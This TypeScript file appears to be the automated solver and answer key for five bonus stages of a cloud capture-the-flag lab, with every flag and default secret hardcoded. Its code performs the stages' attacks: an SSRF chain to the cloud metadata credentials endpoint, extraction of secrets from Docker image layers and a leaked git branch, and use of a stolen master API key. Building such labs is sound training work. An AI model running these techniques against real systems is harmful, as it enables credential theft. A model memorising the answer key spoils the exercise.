/**
 * Bonus Stage Solvers (Stage 2C, 2F, 3B, 3D, 5B)
 *
 * These stages cover additional attack surfaces:
 * - Stage 2C: EC2 instance tags leak
 * - Stage 2F: Git branch with leaked credentials
 * - Stage 3B: SSRF via announcement preview endpoint
 * - Stage 3D: Docker image layer secrets
 * - Stage 5B: Internal API with master key
 */

import { DescribeInstancesCommand } from "@aws-sdk/client-ec2";
import { createEC2Client } from "../lib/aws.js";
import type { StageResult } from "../lib/reporter.js";
import { runProjectCommand } from "../lib/process.js";
import { hasAwsRuntime, isDevTarget, withPortalPath } from "../lib/target.js";
import type { SolverContext, SolverOutput } from "./tutorials.js";

const FLAGS = {
  STAGE_2C: "TVAULT{ec2_tags_are_not_secrets}",
  STAGE_2F: "TVAULT{gitleaks_finds_what_humans_miss}",
  STAGE_3B: "TVAULT{imdsv1_ssrf_is_classic}",
  STAGE_3D: "TVAULT{docker_layer_never_lies}",
  STAGE_5B: "TVAULT{combined_attack_surface}",
} as const;

const STAGE5B_DEFAULT_API_KEY = "tvault-master-3D-layer-secret-key-2026";
const STAGE5B_DEFAULT_DISCLOSURE_TOKEN = "tvault-route-d-disclosure-2026";
const STAGE5B_DEFAULT_PATH = "/api/internal/full-disclosure";

function extractFlag(value: string): string | undefined {
  return value.match(/TVAULT\{[^}]+\}/)?.[0];
}

async function readEnvStyleValue(
  filePath: string,
  key: string,
): Promise<string | undefined> {
  const file = Bun.file(filePath);
  if (!(await file.exists())) return undefined;

  const content = await file.text();
  const line = content
    .split(/\r?\n/)
    .find((entry) => entry.trim().startsWith(`${key}=`));
  return line?.split("=", 2)[1]?.trim();
}

async function readStage5BMetadata(
  ctx: SolverContext,
): Promise<{ token?: string }> {
  const vectorFile = Bun.file(
    `${ctx.projectRoot}/apps/infra/assets/s3-vectors/customer-vault-documents.json`,
  );
  if (!(await vectorFile.exists())) return {};

  const vectors = await vectorFile.json() as Array<{
    key?: string;
    metadata?: {
      managementApiPath?: string;
      disclosureToken?: string;
      documentBody?: string;
    };
  }>;
  const incidentIndex = vectors.find(
    (entry) => entry.key === "tenant-techvault/internal/incident-index",
  );
  const documentBody = incidentIndex?.metadata?.documentBody ?? "";
  const token =
    incidentIndex?.metadata?.disclosureToken ??
    documentBody.match(/X-Disclosure-Token:\s*([A-Za-z0-9_-]+)/)?.[1];

  return { token };
}

/**
 * Stage 2C: EC2 instance Tag "Flag"
 */
async function solveStage2C(ctx: SolverContext): Promise<SolverOutput> {
  if (hasAwsRuntime(ctx)) {
    try {
      const ec2 = createEC2Client(ctx);
      const resp = await ec2.send(new DescribeInstancesCommand({}));
      for (const reservation of resp.Reservations ?? []) {
        for (const instance of reservation.Instances ?? []) {
          const flagTag = instance.Tags?.find((t) => t.Key === "Flag");
          if (flagTag?.Value === FLAGS.STAGE_2C) {
            return { passed: true, flag: FLAGS.STAGE_2C };
          }
        }
      }
    } catch {
      // Fall through to CDK source
    }
  }

  // Fallback: check the Lambda-based EC2 emulator source.
  try {
    const filePath = `${ctx.projectRoot}/apps/infra/lambda/ec2-emulator/index.mjs`;
    const content = await Bun.file(filePath).text();
    if (content.includes(FLAGS.STAGE_2C)) {
      return { passed: true, flag: FLAGS.STAGE_2C };
    }
    return { passed: false, error: "Flag not found in EC2 emulator source" };
  } catch (err) {
    return {
      passed: false,
      error: err instanceof Error ? err.message : "Unknown error",
    };
  }
}

/**
 * Stage 2F: Git branch feature/old-auth in backend-api
 *
 * The flag is in legacy.js on the feature/old-auth branch.
 */
async function solveStage2F(ctx: SolverContext): Promise<SolverOutput> {
  const generatedDir = `${ctx.projectRoot}/season/Cloud-Vault/repos/generated`;
  const repoDir = `${generatedDir}/backend-api`;

  // Check generated repo
  try {
    const repoExists = await Bun.file(`${repoDir}/.git/HEAD`).exists();
    if (repoExists) {
      // Show legacy.js from feature/old-auth branch
      const proc = Bun.spawn(
        ["git", "show", "feature/old-auth:src/auth/legacy.js"],
        { cwd: repoDir, stdout: "pipe", stderr: "pipe" }
      );
      const output = await new Response(proc.stdout).text();
      const flag = extractFlag(output);
      if (flag) {
        return { passed: true, flag };
      }
    }
  } catch {
    // Fall through
  }

  // Fallback: check the seed commit data on disk
  try {
    const legacyPaths = [
      `${ctx.projectRoot}/season/Cloud-Vault/repos/backend-api/commits/feature-old-auth/01-legacy-auth/src/auth/legacy.js`,
      `${ctx.projectRoot}/season/Cloud-Vault/repos/backend-api/commits/feature-old-auth/03-cleanup/src/auth/legacy.js`,
    ];

    for (const legacyPath of legacyPaths) {
      const file = Bun.file(legacyPath);
      if (await file.exists()) {
        const content = await file.text();
        const flag = extractFlag(content);
        if (flag) {
          return { passed: true, flag };
        }
      }
    }

    return {
      passed: false,
      error: "Flag not found in legacy.js seed data",
    };
  } catch (err) {
    return {
      passed: false,
      error: err instanceof Error ? err.message : "Unknown error",
    };
  }
}

/**
 * Stage 3B: SSRF via announcement preview (portal endpoint)
 *
 * The vulnerability allows arbitrary URL fetching, including IMDS endpoints.
 * The flag is revealed when the attacker accesses the IMDS metadata service.
 */
async function solveStage3B(ctx: SolverContext): Promise<SolverOutput> {
  // Try live portal SSRF
  if (!ctx.staticOnly && ctx.portalAvailable) {
    try {
      const internalFetch = new URL("http://internal-data-server/fetch");
      internalFetch.searchParams.set(
        "url",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole"
      );
      const params = new URLSearchParams({ url: internalFetch.toString() });

      // Attempt the intended two-step SSRF path:
      // announcement preview -> internal API /fetch -> EC2 IMDS.
      const resp = await fetch(
        withPortalPath(ctx, `/api/announcements/preview?${params}`),
        { signal: AbortSignal.timeout(5000) }
      );
      const body = await resp.text();
      if (body.includes(FLAGS.STAGE_3B)) {
        return { passed: true, flag: FLAGS.STAGE_3B };
      }
    } catch {
      // Fall through to source checks.
    }
  }

  // Fallback: check announcement preview source for the SSRF vulnerability pattern
  // and check if the flag exists in the EC2 user data or IMDS mock
  try {
    const routePath = `${ctx.projectRoot}/apps/portal/src/app/api/announcements/preview/route.ts`;
    const file = Bun.file(routePath);
    if (!(await file.exists())) {
      return { passed: false, error: `File not found: ${routePath}` };
    }
    const content = await file.text();

    // Verify the SSRF vulnerability exists (no URL validation)
    const hasSsrfVuln =
      content.includes("fetch(url") && !content.includes("isPrivateIP");

    if (!hasSsrfVuln) {
      return {
        passed: false,
        error: "SSRF vulnerability pattern not found in announcement preview route",
      };
    }

    const routeFlag = extractFlag(content);
    if (routeFlag === FLAGS.STAGE_3B) {
      return { passed: true, flag: routeFlag };
    }

    // Check for the flag in EC2 user data, Lambda, or infra assets
    const searchPaths = [
      `${ctx.projectRoot}/apps/infra/lambda/ec2-emulator/index.mjs`,
      `${ctx.projectRoot}/apps/infra/lambda/challenge-server/index.mjs`,
      `${ctx.projectRoot}/apps/infra/lib/ctf-lambda-stack.ts`,
    ];

    for (const searchPath of searchPaths) {
      const file = Bun.file(searchPath);
      if (await file.exists()) {
        const fileContent = await file.text();
        if (fileContent.includes(FLAGS.STAGE_3B)) {
          return { passed: true, flag: FLAGS.STAGE_3B };
        }
      }
    }

    // SSRF vuln confirmed; flag retrieval depends on IMDS in deployed environment
    return {
      passed: false,
      error:
        "SSRF vulnerability confirmed but flag requires IMDS access (deployed environment only)",
    };
  } catch (err) {
    return {
      passed: false,
      error: err instanceof Error ? err.message : "Unknown error",
    };
  }
}

/**
 * Stage 3D: Docker image layer (secret.txt on disk)
 */
async function solveStage3D(ctx: SolverContext): Promise<SolverOutput> {
  if (!ctx.staticOnly) {
    const image =
      process.env.CTF_ECR_IMAGE_URI ??
      (isDevTarget(ctx)
        ? ""
        : "000000000000.dkr.ecr.us-east-1.localhost:4566/techvault/data-processor:latest");
    try {
      if (!image) {
        throw new Error("CTF_ECR_IMAGE_URI is not set");
      }
      await runProjectCommand(ctx, ["docker", "pull", image]);
      const content = await runProjectCommand(ctx, [
        "zsh",
        "-lc",
        [
          "set -euo pipefail",
          "tmp=$(mktemp -d)",
          "trap 'rm -rf \"$tmp\"' EXIT",
          `docker save ${image} -o "$tmp/image.tar"`,
          "tar -xf \"$tmp/image.tar\" -C \"$tmp\"",
          "found=0",
          "for layer in \"$tmp\"/*/layer.tar; do",
          "  if tar -tf \"$layer\" | grep -q '^app/secret.txt$'; then",
          "    tar -xOf \"$layer\" app/secret.txt",
          "    found=1",
          "    break",
          "  fi",
          "done",
          "test \"$found\" = 1",
        ].join("; "),
      ]);
      if (content.includes(FLAGS.STAGE_3D)) {
        return { passed: true, flag: FLAGS.STAGE_3D };
      }
    } catch {
      // Fall through to static source check.
    }
  }

  try {
    const filePath = `${ctx.projectRoot}/apps/infra/docker/data-processor/secret.txt`;
    const file = Bun.file(filePath);
    if (!(await file.exists())) {
      return { passed: false, error: `File not found: ${filePath}` };
    }

    const content = await file.text();
    if (content.includes(FLAGS.STAGE_3D)) {
      return { passed: true, flag: FLAGS.STAGE_3D };
    }

    return { passed: false, error: "Flag not found in secret.txt" };
  } catch (err) {
    return {
      passed: false,
      error: err instanceof Error ? err.message : "Unknown error",
    };
  }
}

/**
 * Stage 5B: POST /api/internal/full-disclosure with X-API-Key
 *
 * The API master key is found in the Docker image layer (Stage 3D).
 */
async function solveStage5B(ctx: SolverContext): Promise<SolverOutput> {
  // Stage 3D: API key and internal API path from Docker image layer / secret.txt.
  const secretFileApiKey = await readEnvStyleValue(
    `${ctx.projectRoot}/apps/infra/docker/data-processor/secret.txt`,
    "API_MASTER_KEY",
  );
  const secretFileApiPath = await readEnvStyleValue(
    `${ctx.projectRoot}/apps/infra/docker/data-processor/secret.txt`,
    "INTERNAL_MANAGEMENT_API",
  );
  const apiKey =
    process.env.API_MASTER_KEY ??
    secretFileApiKey ??
    STAGE5B_DEFAULT_API_KEY;
  const endpointPath = secretFileApiPath ?? STAGE5B_DEFAULT_PATH;

  // Stage 3E: disclosure token from S3 Vectors metadata.
  const stage5bMetadata = await readStage5BMetadata(ctx);
  const disclosureToken =
    process.env.STAGE5B_DISCLOSURE_TOKEN ??
    stage5bMetadata.token ??
    STAGE5B_DEFAULT_DISCLOSURE_TOKEN;

  // Try live portal
  if (!ctx.staticOnly && ctx.portalAvailable) {
    try {
      const resp = await fetch(
        withPortalPath(ctx, endpointPath),
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-API-Key": apiKey,
            "X-Disclosure-Token": disclosureToken,
          },
          body: JSON.stringify({ request: "full-evidence-report" }),
          signal: AbortSignal.timeout(5000),
        }
      );
      const data = await resp.json() as {
        bonus_flag?: string;
      };
      if (data?.bonus_flag === FLAGS.STAGE_5B) {
        return { passed: true, flag: FLAGS.STAGE_5B };
      }
    } catch {
      // Fall through
    }
  }

  // Fallback: check source code
  try {
    const filePath = `${ctx.projectRoot}/apps/portal/src/app/api/internal/full-disclosure/route.ts`;
    const content = await Bun.file(filePath).text();
    if (
      content.includes(FLAGS.STAGE_5B) &&
      content.includes("X-Disclosure-Token")
    ) {
      return { passed: true, flag: FLAGS.STAGE_5B };
    }
    return {
      passed: false,
      error: "Flag not found in full-disclosure route source",
    };
  } catch (err) {
    return {
      passed: false,
      error: err instanceof Error ? err.message : "Unknown error",
    };
  }
}

type SolverFn = (ctx: SolverContext) => Promise<SolverOutput>;

const SOLVERS: ReadonlyArray<{
  id: string;
  name: string;
  solver: SolverFn;
}> = [
  { id: "Stage 2C", name: "EC2 instance tag", solver: solveStage2C },
  { id: "Stage 2F", name: "Git branch feature/old-auth", solver: solveStage2F },
  { id: "Stage 3B", name: "SSRF via announcement preview", solver: solveStage3B },
  { id: "Stage 3D", name: "Docker image layer secret.txt", solver: solveStage3D },
  { id: "Stage 5B", name: "Internal API full-disclosure", solver: solveStage5B },
];

export async function solveBonus(
  ctx: SolverContext
): Promise<readonly StageResult[]> {
  const results: StageResult[] = [];

  for (const { id, name, solver } of SOLVERS) {
    const output = await solver(ctx);
    results.push({
      id,
      name,
      status: output.passed
        ? "pass"
        : output.error?.includes("not available") ||
            output.error?.includes("deployed environment only")
          ? "skip"
          : "fail",
      flag: output.flag,
      error: output.error,
      category: "Bonus",
    });
  }

  return results;
}
